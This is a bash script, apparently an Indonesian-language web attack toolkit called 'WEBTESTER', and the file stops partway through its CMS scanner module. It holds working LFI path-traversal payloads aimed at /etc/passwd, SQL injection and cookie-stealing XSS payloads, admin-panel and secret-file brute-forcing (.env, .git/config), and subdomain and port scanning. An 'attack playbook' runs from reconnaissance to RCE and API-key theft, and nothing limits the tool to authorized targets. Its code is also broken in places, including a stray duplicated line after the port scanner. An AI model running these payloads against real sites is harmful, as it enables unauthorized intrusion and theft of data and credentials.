#!/bin/bash

# =====================================================
#        WEBTESTER v1.0 - PROFESSIONAL FRAMEWORK      
#   "International Standardization Pentesting Tool"
# =====================================================

# --- [ SISTEM PENDUKUNG ] ---

function disable_sleep {
    if command -v caffeinate &> /dev/null; then
        caffeinate -i & 
        sleep_pid=$!
    elif command -v xset &> /dev/null; then
        xset s off -dpms
    fi
}

function enable_sleep {
    if [[ -n $sleep_pid ]]; then
        kill $sleep_pid &> /dev/null
    elif command -v xset &> /dev/null; then
        xset s on +dpms
    fi
}

# --- [ MODUL 01: LFI SCANNER (DETAILED LOG) ] ---

function start_scanner {
    clear
    local nama_modul="LFI SCANNER"
    
    echo -e "\e[36m============================================================================="
    echo -e "                 MODUL 01: LOCAL FILE INCLUSION (LFI) SCANNER                "
    echo -e "=============================================================================\e[0m"
    
    read -p "Masukkan URL Target (contoh: http://site.com/v.php?id=): " target

    if [[ -z "$target" ]]; then
        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"
        return
    fi

    # --- LOGIKA PENAMAAN FILE ---
    domain_clean=$(echo "$target" | sed -e 's|^[^/]*//||' -e 's|/.*$||' | awk -F. '{if (NF>1) print $(NF-1); else print $1}')
    log_file="${domain_clean^^} ${nama_modul}.txt"

    # Normalisasi URL
    if [[ "$target" == *"="* ]]; then
        final_target="$target"
    else
        [[ "${target: -1}" != "/" ]] && final_target="$target/" || final_target="$target"
    fi

    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    
    paths=(
        "/etc/passwd" 
        "../../etc/passwd" 
        "../../../../etc/passwd" 
        "../../../../../../../../etc/passwd"
        "php://filter/read=convert.base64-encode/resource=/etc/passwd"
        "/etc/passwd%00"
        "/proc/self/environ"
    )

    echo -e "\n\e[33m[*] Memulai Scanning di: $final_target\e[0m"
    echo -e "\e[33m[*] File Log: $log_file\e[0m"
    echo "-----------------------------------------------------"

    # Inisialisasi Header Tabel di Log
    {
        echo "====================================================="
        echo "          LFI DETAILED AUDIT REPORT                  "
        echo "====================================================="
        echo "TARGET : $final_target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
        printf "%-50s | %-15s\n" "PAYLOAD / PATH" "STATUS"
        echo "-----------------------------------------------------"
    } > "$log_file"

    found=0
    for path in "${paths[@]}"; do
        echo -ne "  [*] Testing: $path \r"
        response=$(curl -s -k -L -A "$ua" --connect-timeout 10 "$final_target$path")

        # Cek apakah Vulnerable
        if [[ "$response" == *"root:x:0:0"* || "$response" == *"root:"* ]]; then
            status="TERBUKA (VULN)"
            echo -e "  \e[32m[+] $path -> $status\e[0m"
            ((found++))
        else
            status="TERPROTEKSI"
        fi

        # Tulis setiap percobaan ke file log dengan format kolom
        printf "%-50s | %-15s\n" "$path" "$status" >> "$log_file"
        sleep 0.2
    done

    echo -ne "                                                                                \r"
    echo -e "\n-----------------------------------------------------"
    echo "-----------------------------------------------------" >> "$log_file"
    
    if [ $found -gt 0 ]; then
        echo -e "\e[32m[✓] Scan Selesai! $found celah ditemukan.\e[0m"
        echo "KESIMPULAN: DITEMUKAN $found TITIK LEMAH" >> "$log_file"
    else
        echo -e "\e[31m[-] Scan Selesai. Tidak ada celah ditemukan.\e[0m"
        echo "KESIMPULAN: SISTEM TERLIHAT AMAN (LFI)" >> "$log_file"
    fi
    
    echo -e "\e[33mTekan Enter untuk kembali ke menu.\e[0m"
    read
}
# --- [ MODUL 02: SQL INJECTION AUTO TESTER ] ---

function start_sqli_tester {
    clear
    local nama_modul="SQLI TESTER"
    
    echo -e "\e[36m============================================================================="
    echo -e "                 MODUL 02: SQL INJECTION (SQLi) AUTO TESTER                  "
    echo -e "=============================================================================\e[0m"
    echo -e "\e[33m[INFO]:\e[0m Mencari celah Error-Based SQLi pada parameter URL."
    echo "-----------------------------------------------------------------------------"
    
    read -p "Masukkan URL Full (contoh: http://site.com/product.php?id=1): " target

    if [[ -z "$target" ]]; then 
        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"
        return
    fi

    # Ekstraksi nama domain murni
    domain_clean=$(echo "$target" | sed -e 's|^[^/]*//||' -e 's|/.*$||' | awk -F. '{if (NF>1) print $(NF-1); else print $1}')
    log_file="${domain_clean^^} ${nama_modul}.txt"

    # List payload untuk memicu error database
    sqli_payloads=("'" "''" "\"" "\"\"" "')" "';" "admin'--" "' OR 1=1--" "' OR '1'='1" " order by 10--")

    echo -e "\n[*] Memulai Scanning di: $target"
    echo -e "[*] File Log: $log_file"
    echo "-----------------------------------------------------------------------------"

    # Inisialisasi Header Tabel di Log
    {
        echo "====================================================="
        echo "          SQLi DETAILED AUDIT REPORT                 "
        echo "====================================================="
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
        printf "%-25s | %-30s\n" "PAYLOAD INJECTED" "HASIL / RESPONS SERVER"
        echo "-----------------------------------------------------"
    } > "$log_file"

    found=0
    for polyglot in "${sqli_payloads[@]}"; do
        echo -ne "  [*] Injecting Payload: $polyglot \r"
        
        response=$(curl -s -k -L --connect-timeout 10 "$target$polyglot")

        # Deteksi pesan error database
        if echo "$response" | grep -qiE "mysql_fetch_array|SQL syntax|Unclosed quotation mark|PostgreSQL query failed|Oracle Error|MariaDB server version|Syntax error|Dynamic SQL Error|ORA-00933"; then
            status="VULNERABLE (ERROR DETECTED)"
            echo -e "  \e[31m[!!!] $polyglot -> $status\e[0m"
            ((found++))
        else
            status="NORMAL (NO ERROR)"
        fi

        # Tulis ke tabel log (dengan format kolom)
        printf "%-25s | %-30s\n" "$polyglot" "$status" >> "$log_file"
        sleep 0.4
    done

    echo -ne "                                                                                \r"
    echo -e "\n-----------------------------------------------------------------------------"
    echo "-----------------------------------------------------" >> "$log_file"

    if [ $found -gt 0 ]; then
        echo -e "\e[32m[✓] Sukses! $found Payload memicu error. Cek '$log_file'\e[0m"
        echo "KESIMPULAN: TARGET RENTAN TERHADAP ERROR-BASED SQLi" >> "$log_file"
        echo "TOTAL TEMUAN: $found PAYLOAD" >> "$log_file"
    else
        echo -e "\e[31m[-] Scan Selesai. Tidak ditemukan Error Database.\e[0m"
        echo "KESIMPULAN: TIDAK DITEMUKAN MASALAH (SQLi ERROR-BASED)" >> "$log_file"
    fi
    
    echo -e "\n\e[33mTekan Enter untuk kembali ke menu.\e[0m"
    read
}
# --- [ MODUL 02: STRATEGY PLAYBOOK ] ---

function show_strategy {
    clear
    echo -e "\e[33m"
    echo "============================================================================="
    echo "          WEBTESTER COMPLETE ATTACK PLAYBOOK (FULL 20 MODULES)               "
    echo "============================================================================="
    echo -e "\e[0m"
    
    echo -e "\e[35m[ FASE 1: RECONNAISSANCE - Pengumpulan Informasi ]\e[0m"
    echo " 06 -> Cari semua Subdomain untuk memperluas target."
    echo " 08 -> Scan Port & Service untuk melihat pintu masuk (SSH, FTP, HTTP)."
    echo " 13 -> Cek apakah ada Subdomain yang bisa diambil alih (Takeover)."
    echo ""
    echo -e "\e[35m[ FASE 2: CONTENT DISCOVERY - Pemetaan Struktur ]\e[0m"
    echo " 07 -> Brute-force Folder/Direktori tersembunyi."
    echo " 04 -> Cari halaman Admin khusus (Admin Panel Finder)."
    echo " 15 -> Temukan Endpoint API (REST/GraphQL) yang sering terlupakan."
    echo " 09 -> Identifikasi CMS (WP/Joomla) dan cari celah spesifiknya."
    echo ""
    echo -e "\e[35m[ FASE 3: VULNERABILITY SCANNING - Pencarian Celah ]\e[0m"
    echo " 05 -> Hunting file sensitif (.env, .git, .sql) secara langsung."
    echo " 01 -> Eksploitasi LFI jika ada parameter file."
    echo " 02 -> Uji SQL Injection untuk menembus database."
    echo " 03 -> Uji XSS untuk menyerang sisi client/user."
    echo ""
    echo -e "\e[35m[ FASE 4: ADVANCED EXPLOITATION - Penetrasi Dalam ]\e[0m"
    echo " 11 -> Gunakan SSRF untuk memukul server internal dari dalam."
    echo " 16 -> Uji IDOR (Broken Access Control) untuk akses data user lain."
    echo " 17 -> Lakukan HTTP Smuggling untuk memanipulasi Load Balancer."
    echo " 18 -> Debug dan hack JWT Token untuk bypass login."
    echo " 10 -> Jika memungkinkan, eksekusi perintah sistem (RCE)."
    echo ""
    echo -e "\e[35m[ FASE 5: POST-EXPLOITATION & ANALYSIS ]\e[0m"
    echo " 12 -> Cek miskonfigurasi CORS untuk pencurian data antar domain."
    echo " 14 -> Cari bucket Cloud (S3/GCP) yang terbuka publik."
    echo " 19 -> Analisis Security Headers & SSL untuk celah enkripsi."
    echo " 20 -> Bedah file JavaScript untuk menemukan API Keys rahasia."
    echo ""
    echo "============================================================================="
    echo " TIPS: Mulailah dari Fase 1 ke Fase 5 untuk hasil penetrasi maksimal."
    echo "============================================================================="
    read -p "Tekan Enter untuk kembali ke Menu Utama..."
}
# --- [ MODUL 03: XSS REFLECTED SCANNER (DETAILED TABLE) ] ---

function start_xss_scanner {
    clear
    local nama_modul="XSS REFLECTED SCANNER"
    
    echo -e "\e[36m"
    echo "============================================================================="
    echo "                 MODUL 03: $nama_modul                             "
    echo "============================================================================="
    echo -e "\e[0m"
    echo -e "\e[33m[ INFO ]:\e[0m Menguji apakah input URL dipantulkan (reflected) ke browser."
    echo "-----------------------------------------------------------------------------"

    read -p "Masukkan URL Full (contoh: http://site.com/search.php?q=): " target

    if [[ -z "$target" ]]; then
        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"
        return
    fi

    # --- LOGIKA PENAMAAN FILE ---
    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local filename="${domain^^} ${nama_modul}.txt"

    # Payload XSS Terkurasi
    xss_payloads=(
        "<script>alert('XSS')</script>"
        "\"><script>alert(1)</script>"
        "';alert(document.cookie);"
        "<img src=x onerror=alert(1)>"
        "<svg/onload=alert(1)>"
        "javascript:alert(1)"
        "\"><details/open/ontoggle=alert(1)>"
        "\" autofocus onfocus=alert(1)//"
    )

    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"

    echo -e "\n[*] Memulai Scanning XSS pada: $target"
    echo -e "[*] File Log: $filename"
    echo "-----------------------------------------------------------------------------"

    # Inisialisasi Header Tabel di Log
    {
        echo "====================================================="
        echo "          XSS DETAILED AUDIT REPORT                  "
        echo "====================================================="
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
        printf "%-45s | %-20s\n" "XSS PAYLOAD TESTED" "STATUS RESPONS"
        echo "-----------------------------------------------------"
    } > "$filename"

    found_xss=0
    for payload in "${xss_payloads[@]}"; do
        echo -ne "  [*] Testing: $payload \r"
        
        # URL Encode payload menggunakan Python
        encoded_payload=$(echo -ne "$payload" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))")
        
        # Kirim request
        response=$(curl -s -k -L -A "$ua" "$target$encoded_payload")

        # Cek apakah payload dipantulkan utuh (Reflected)
        if [[ "$response" == *"$payload"* ]]; then
            status="TERPANTUL (VULN)"
            echo -e "  \e[31m[!!!] $payload -> $status\e[0m"
            ((found_xss++))
        else
            status="TERFILTER/AMAN"
        fi

        # Tulis ke tabel log
        printf "%-45s | %-20s\n" "$payload" "$status" >> "$filename"
        sleep 0.2
    done

    echo -ne "                                                                                \r"
    echo -e "\n-----------------------------------------------------------------------------"
    echo "-----------------------------------------------------" >> "$filename"
    
    if [ $found_xss -eq 0 ]; then
        echo -e "\e[31m[-] Scan Selesai. Tidak ditemukan indikasi Reflected XSS.\e[0m"
        echo "KESIMPULAN: TIDAK DITEMUKAN MASALAH (XSS REFLECTED)" >> "$filename"
    else
        echo -e "\e[32m[+] Scan Selesai! $found_xss celah potensial ditemukan.\e[0m"
        echo "KESIMPULAN: TARGET RENTAN TERHADAP REFLECTED XSS" >> "$filename"
        echo "TOTAL TEMUAN: $found_xss" >> "$filename"
    fi
    
    echo -e "[*] Laporan lengkap tersimpan di: $filename"
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 04: ADMIN PANEL FINDER (DETAILED TABLE) ] ---

function start_admin_finder {
    clear
    local nama_modul="ADMIN FINDER"
    
    echo -e "\e[36m============================================================================="
    echo -e "                 MODUL 04: ADMIN PANEL FINDER (ULTRA BRUTE)                  "
    echo -e "=============================================================================\e[0m"
    echo -e "\e[33m[INFO]:\e[0m Mencari gerbang masuk admin/backend pada target."
    echo "-----------------------------------------------------------------------------"

    read -p "Masukkan URL Target (contoh: http://site.com/): " target

    if [[ -z "$target" ]]; then
        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"
        return
    fi

    # Memastikan URL diakhiri dengan /
    [[ "${target: -1}" != "/" ]] && target="$target/"

    # Ekstraksi nama domain untuk penamaan file
    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local filename="${domain^^} ${nama_modul}.txt"

    # Wordlist Admin Panel Terkurasi
    admin_paths=(
        "admin/" "administrator/" "admin1/" "admin2/" "moderator/" "webadmin/" 
        "adminpanel/" "adm/" "admin_panel/" "cms/" "operator/" "controlpanel/" 
        "cp/" "cpanel/" "login/" "auth/" "wp-login.php" "wp-admin/" "backend/" 
        "manage/" "manager/" "panel/" "staff/" "phpmyadmin/" "pma/" "login.php"
    )

    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"

    echo -e "\n[*] Memulai Brute-force Path pada: $target"
    echo -e "[*] File Log: $filename"
    echo "-----------------------------------------------------------------------------"

    # Inisialisasi Header Tabel di Log
    {
        echo "====================================================="
        echo "          ADMIN PANEL FINDER AUDIT REPORT            "
        echo "====================================================="
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
        printf "%-30s | %-10s | %-15s\n" "PATH TESTED" "HTTP CODE" "STATUS"
        echo "-----------------------------------------------------"
    } > "$filename"

    found_admin=0
    for path in "${admin_paths[@]}"; do
        echo -ne "  [*] Checking: /$path \r"

        # Cek HTTP Status Code
        status_code=$(curl -s -o /dev/null -w "%{http_code}" -k -L -A "$ua" "$target$path")

        # Logika Penentuan Status
        if [[ "$status_code" == "200" ]]; then
            res_status="DITEMUKAN"
            color="\e[32m"
            ((found_admin++))
        elif [[ "$status_code" == "403" ]]; then
            res_status="DILARANG (403)"
            color="\e[33m"
            ((found_admin++))
        elif [[ "$status_code" == "401" ]]; then
            res_status="BUTUH LOGIN"
            color="\e[35m"
            ((found_admin++))
        else
            res_status="TIDAK ADA"
            color="\e[31m"
        fi

        # Tampilkan di layar jika ditemukan/menarik
        if [[ "$status_code" == "200" || "$status_code" == "403" || "$status_code" == "401" ]]; then
             echo -e "  [+] $path -> ${color}$res_status\e[0m"
        fi

        # Tulis ke tabel log (.txt)
        printf "%-30s | %-10s | %-15s\n" "/$path" "$status_code" "$res_status" >> "$filename"
        
        sleep 0.05
    done

    echo -ne "                                                                                \r"
    echo -e "\n-----------------------------------------------------------------------------"
    echo "-----------------------------------------------------" >> "$filename"
    
    if [ $found_admin -gt 0 ]; then
        echo -e "\e[32m[✓] Scan Selesai! $found_admin halaman potensial ditemukan.\e[0m"
        echo "KESIMPULAN: DITEMUKAN $found_admin HALAMAN AKSES BACKEND" >> "$filename"
    else
        echo -e "\e[31m[-] Scan Selesai. Tidak ditemukan halaman admin standar.\e[0m"
        echo "KESIMPULAN: TIDAK DITEMUKAN PATH ADMIN STANDAR" >> "$filename"
    fi
    
    echo -e "[*] Laporan audit tersimpan di: $filename"
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 05: SENSITIVE FILE HUNTER (DETAILED TABLE) ] ---

function start_secret_hunter {
    clear
    local nama_modul="SECRET HUNTER"
    
    echo -e "\e[36m============================================================================="
    echo -e "                 MODUL 05: SENSITIVE FILE & SECRET HUNTER                    "
    echo -e "=============================================================================\e[0m"
    echo -e "\e[33m[INFO]:\e[0m Mencari file konfigurasi, backup, dan folder rahasia (Leaked Data)."
    echo "-----------------------------------------------------------------------------"
    
    read -p "Masukkan URL Target (contoh: http://site.com/): " target

    if [[ -z "$target" ]]; then
        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"
        return
    fi

    # Memastikan URL diakhiri dengan /
    [[ "${target: -1}" != "/" ]] && target="$target/"

    # Ekstraksi nama domain untuk penamaan file
    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local filename="${domain^^} ${nama_modul}.txt"

    # Daftar file sensitif (High Risk)
    secrets=(
        ".env" ".env.local" "config.php.bak" ".git/config" ".gitignore" 
        ".htaccess" "web.config" "phpinfo.php" "info.php" "test.php" 
        "database.sql" "db.sql" "backup.zip" "docker-compose.yml" 
        "package.json" "composer.json" ".vscode/" ".idea/"
    )

    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"

    echo -e "\n[*] Memulai Hunting di: $target"
    echo -e "[*] File Log: $filename"
    echo "-----------------------------------------------------------------------------"

    # Inisialisasi Header Tabel di Log
    {
        echo "====================================================="
        echo "          SENSITIVE FILE HUNTER REPORT               "
        echo "====================================================="
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
        printf "%-30s | %-10s | %-15s\n" "FILE TESTED" "HTTP CODE" "SIZE/STATUS"
        echo "-----------------------------------------------------"
    } > "$filename"

    found_secrets=0
    for file in "${secrets[@]}"; do
        echo -ne "  [*] Hunting: /$file \r"

        # Cek HTTP Status & Ukuran Download
        response=$(curl -s -k -L -A "$ua" -o /dev/null -w "%{http_code}:%{size_download}" "$target$file")
        status_code=$(echo $response | cut -d':' -f1)
        file_size=$(echo $response | cut -d':' -f2)

        if [[ "$status_code" == "200" && "$file_size" -gt 0 ]]; then
            res_status="DITEMUKAN"
            display_size="${file_size} bytes"
            color="\e[32m"
            echo -e "  [!] \e[32mFOUND:\e[0m /$file (${file_size} bytes)"
            ((found_secrets++))
            
            # Peringatan khusus untuk .env
            if [[ "$file" == *".env"* ]]; then
                 echo -e "      \e[31m[CRITICAL] Leakage detected in /$file\e[0m"
            fi
        else
            res_status="TIDAK ADA"
            display_size="-"
            color="\e[0m"
        fi

        # Tulis ke tabel log (.txt)
        printf "%-30s | %-10s | %-15s\n" "/$file" "$status_code" "$display_size" >> "$filename"
        
        sleep 0.05
    done

    echo -ne "                                                                                \r"
    echo -e "\n-----------------------------------------------------------------------------"
    echo "-----------------------------------------------------" >> "$filename"
    
    if [ $found_secrets -gt 0 ]; then
        echo -e "\e[32m[✓] Selesai! $found_secrets file sensitif terdeteksi.\e[0m"
        echo "KESIMPULAN: DITEMUKAN $found_secrets FILE SENSITIF TERBUKA" >> "$filename"
    else
        echo -e "\e[31m[-] Scan Selesai. Tidak ditemukan file sensitif umum.\e[0m"
        echo "KESIMPULAN: TIDAK DITEMUKAN FILE RAHASIA (CLEAN)" >> "$filename"
    fi
    
    echo -e "[*] Laporan audit tersimpan di: $filename"
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 06: SUBDOMAIN ENUMERATOR (DETAILED TABLE) ] ---

function start_subdomain_scanner {
    clear
    local nama_modul="SUBDOMAIN SCANNER"
    
    echo -e "\e[36m============================================================================="
    echo -e "                 MODUL 06: SUBDOMAIN ENUMERATOR (PASSIVE & ACTIVE)           "
    echo -e "=============================================================================\e[0m"
    echo -e "\e[33m[INFO]:\e[0m Mencari 'anak perusahaan' domain melalui SSL logs dan Brute-force."
    echo "-----------------------------------------------------------------------------"

    read -p "Masukkan Domain Utama (contoh: site.com): " domain

    if [[ -z "$domain" ]]; then
        echo -e "\e[31m[!] Domain tidak boleh kosong!\e[0m"
        return
    fi

    # Format Nama File: <DOMAIN> SUBDOMAIN SCANNER.txt
    local filename="${domain^^} ${nama_modul}.txt"

    echo -e "\n\e[33m[*] Menjalankan Passive Discovery (crt.sh)... \e[0m"
    # Mengambil data dari sertifikat SSL publik
    passive_list=$(curl -s "https://crt.sh/?q=%25.$domain&output=json" | grep -Po '"name_value":"\K[^"]*' | sort -u)

    echo -e "[*] Memulai Active Check & Brute-force..."
    echo -e "[*] File Log: $filename"
    echo "-----------------------------------------------------------------------------"

    # Inisialisasi Header Tabel di Log
    {
        echo "====================================================="
        echo "          SUBDOMAIN ENUMERATION REPORT               "
        echo "====================================================="
        echo "TARGET DOMAIN : $domain"
        echo "DATE          : $(date)"
        echo "-----------------------------------------------------"
        printf "%-35s | %-18s | %-10s\n" "SUBDOMAIN" "IP ADDRESS" "STATUS"
        echo "-----------------------------------------------------"
    } > "$filename"

    # Gabungkan list pasif dengan list brute-force umum
    subs_brute=("www" "dev" "test" "api" "staging" "admin" "mail" "blog" "v1" "v2" "shop" "internal" "portal" "cloud")
    
    # Masukkan hasil pasif ke dalam array pengerjaan
    mapfile -t all_subs < <(echo -e "${passive_list}\n$(printf "%s.$domain\n" "${subs_brute[@]}")" | sort -u)

    found_count=0
    for s in "${all_subs[@]}"; do
        # Bersihkan karakter wildcard (*.) jika ada dari crt.sh
        s_clean=$(echo "$s" | sed 's/\*\.//g')
        
        echo -ne "  [*] Resolving: $s_clean \r"

        # Cek apakah subdomain resolve ke IP (menggunakan perintah 'host' atau 'getent')
        check=$(getent hosts "$s_clean")
        
        if [[ -n "$check" ]]; then
            ip=$(echo "$check" | awk '{print $1}')
            res_status="AKTIF"
            color="\e[32m"
            echo -e "  [+] \e[32mFOUND:\e[0m $s_clean [$ip]"
            ((found_count++))
        else
            ip="-"
            res_status="NON-AKTIF"
            color="\e[0m"
        fi

        # Tulis ke tabel log (.txt)
        printf "%-35s | %-18s | %-10s\n" "$s_clean" "$ip" "$res_status" >> "$filename"
        
        sleep 0.1
    done

    echo -ne "                                                                                \r"
    echo -e "\n-----------------------------------------------------------------------------"
    echo "-----------------------------------------------------" >> "$filename"
    
    if [ $found_count -gt 0 ]; then
        echo -e "\e[32m[✓] Selesai! $found_count subdomain aktif ditemukan.\e[0m"
        echo "KESIMPULAN: DITEMUKAN $found_count SUBDOMAIN AKTIF" >> "$filename"
    else
        echo -e "\e[31m[-] Scan Selesai. Tidak ada subdomain tambahan yang resolve.\e[0m"
        echo "KESIMPULAN: TIDAK DITEMUKAN SUBDOMAIN AKTIF LAINNYA" >> "$filename"
    fi
    
    echo -e "[*] Daftar lengkap tersimpan di: $filename"
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 07: DIRECTORY BRUTER TURBO (MULTI-THREADED) ] ---

function start_dir_bruter {
    clear
    local nama_modul="DIRECTORY BRUTER"
    
    echo -e "\e[36m============================================================================="
    echo -e "              MODUL 07: DIRECTORY BRUTE-FORCER (TURBO MODE)                  "
    echo -e "=============================================================================\e[0m"

    read -p "Masukkan URL Target (contoh: http://site.com/): " target
    [[ -z "$target" ]] && return
    [[ "${target: -1}" != "/" ]] && target="$target/"

    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local filename="${domain^^} ${nama_modul}.txt"

    # Wordlist diperluas
    wordlist=("admin" "login" "config" "api" "v1" "v2" "db" "backup" ".env" ".git" "phpmyadmin" "secret" "dev" "staging" "test")
    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    # --- PENGATURAN MULTI-THREADING ---
    local threads=5             # Jumlah request bersamaan
    local temp_fifo="/tmp/$$.fifo"
    mkfifo "$temp_fifo"
    exec 3<>"$temp_fifo"
    rm "$temp_fifo"

    for ((i=0; i<threads; i++)); do echo >&3; done
    # ----------------------------------

    echo -e "\n[*] Memulai Turbo Scan (Threads: $threads) pada: $target"
    echo "-----------------------------------------------------------------------------"

    {
        echo "====================================================="
        echo "        TURBO DIRECTORY BRUTE-FORCE REPORT           "
        echo "====================================================="
        printf "%-25s | %-12s | %-20s\n" "PATH TESTED" "HTTP CODE" "STATUS"
        echo "-----------------------------------------------------"
    } > "$filename"

    found_count=0

    # Fungsi Internal untuk scanning (supaya bisa di-background)
    function check_path {
        local path=$1
        local target=$2
        local ua=$3
        local log=$4

        local status_code=$(curl -s -o /dev/null -w "%{http_code}" -k -L -A "$ua" "$target$path")

        if [[ "$status_code" != "404" && "$status_code" != "000" ]]; then
            local res_status="UKNOWN"
            local color="\e[0m"
            
            case $status_code in
                200) res_status="DITEMUKAN (OK)"; color="\e[32m" ;;
                403) res_status="FORBIDDEN (403)"; color="\e[33m" ;;
                301|302) res_status="REDIRECT"; color="\e[34m" ;;
                500) res_status="SERVER ERROR"; color="\e[31m" ;;
            esac

            echo -e "  [+] /$path -> ${color}$status_code $res_status\e[0m"
            printf "%-25s | %-12s | %-20s\n" "/$path" "$status_code" "$res_status" >> "$log"
        fi
    }

    for path in "${wordlist[@]}"; do
        read -u3 # Mengambil jatah thread
        (
            check_path "$path" "$target" "$ua" "$filename"
            echo >&3 # Mengembalikan jatah thread
        ) &
    done

    wait # Menunggu semua background process selesai
    exec 3>&- # Menutup file descriptor

    echo -e "-----------------------------------------------------------------------------"
    echo -e "\e[32m[✓] Scan Selesai!\e[0m Laporan tersimpan di: $filename"
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 08: PORT SCANNER & SERVICE DISCOVERY (DETAILED TABLE) ] ---

function start_port_scanner {
    clear
    local nama_modul="PORT SCANNER"
    
    echo -e "\e[36m============================================================================="
    echo -e "                 MODUL 08: PORT SCANNER & SERVICE DISCOVERY                  "
    echo -e "=============================================================================\e[0m"
    echo -e "\e[33m[INFO]:\e[0m Memeriksa pintu masuk (port) yang terbuka dan layanan yang berjalan."
    echo "-----------------------------------------------------------------------------"

    read -p "Masukkan IP atau Domain Target: " target

    if [[ -z "$target" ]]; then
        echo -e "\e[31m[!] Target tidak boleh kosong!\e[0m"
        return
    fi

    # Format Nama File Log
    local filename="${target^^} ${nama_modul}.txt"

    ports=(21 22 23 25 53 80 110 143 443 445 1433 1521 3306 3389 5432 8080 8443)

    echo -e "\n[*] Memulai pemindaian pada: $target"
    echo -e "[*] File Log: $filename"
    echo "-----------------------------------------------------------------------------"

    # Inisialisasi Header Tabel di Log
    {
        echo "====================================================="
        echo "          PORT SCANNING & SERVICE REPORT             "
        echo "====================================================="
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
        printf "%-10s | %-15s | %-20s\n" "PORT" "STATUS" "SERVICE"
        echo "-----------------------------------------------------"
    } > "$filename"

    found_ports=0
    for port in "${ports[@]}"; do
        echo -ne "  [*] Checking Port: $port \r"

        # Cek Koneksi TCP
        (timeout 1 bash -c "echo > /dev/tcp/$target/$port") >/dev/null 2>&1
        result=$?

        if [ $result -eq 0 ]; then
            case $port in
                21) service="FTP" ;;
                22) service="SSH" ;;
                25) service="SMTP" ;;
                53) service="DNS" ;;
                80) service="HTTP" ;;
                443) service="HTTPS" ;;
                445) service="SMB (Windows)" ;;
                3306) service="MySQL/MariaDB" ;;
                3389) service="Remote Desktop" ;;
                8080|8443) service="Web Alternative" ;;
                *) service="Unknown" ;;
            esac
            
            res_status="OPEN"
            color="\e[32m"
            echo -e "  [+] Port $port -> ${color}$res_status\e[0m ($service)"
            ((found_ports++))
        else
            res_status="CLOSED/FILTERED"
            service="-"
        fi

        # Tulis ke tabel log (.txt)
        printf "%-10s | %-15s | %-20s\n" "$port" "$res_status" "$service" >> "$filename"
    done

    echo -ne "                                                                                \r"
    echo -e "\n-----------------------------------------------------------------------------"
    echo "-----------------------------------------------------" >> "$filename"
    
    if [ $found_ports -gt 0 ]; then
        echo -e "\e[32m[✓] Scan Selesai! $found_ports port aktif ditemukan.\e[0m"
        echo "KESIMPULAN: DITEMUKAN $found_ports PORT TERBUKA" >> "$filename"
    else
        echo -e "\e[31m[-] Scan Selesai. Tidak ada port umum yang terbuka.\e[0m"
        echo "KESIMPULAN: TIDAK ADA PORT UMUM YANG TERDETEKSI" >> "$filename"
    fi
    
    read -p "Tekan Enter untuk kembali ke menu..."
}read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 09: CMS VULNERABILITY SCANNER (DETAILED TABLE) ] ---

function start_cms_scanner {
    clear
    local nama_modul="CMS SCANNER"
    
    echo -e "\e[36m============================================================================="
    echo -e "                 MODUL 09: CMS IDENTIFIER & VULN CHECKER                     "
    echo -e "=============================================================================\e[0m"
    echo -e "\e[33m[INFO]:\e[0m Mengidentifikasi CMS dan mencari kelemahan konfigurasi umum."
    echo "-----------------------------------------------------------------------------"

    read -p "Masukkan URL Target (contoh: http://site.com/): " target

    [[ "${target: -1}" != "/" ]] && target="$target/"

    if [[ -z "$target" ]]; then
        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"
        return
    fi

    # Ekstraksi nama domain untuk penamaan file
    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local filename="${domain^^} ${nama_modul}.txt"

    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    
    echo -e "\n[*] Menganalisis target: $target"
    echo -e "[*] File Log: $filename"
    echo "-----------------------------------------------------------------------------"

    # Inisialisasi Header Log
    {
        echo "====================================================="
        echo "          CMS IDENTIFICATION & AUDIT REPORT          "
        echo "====================================================="
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
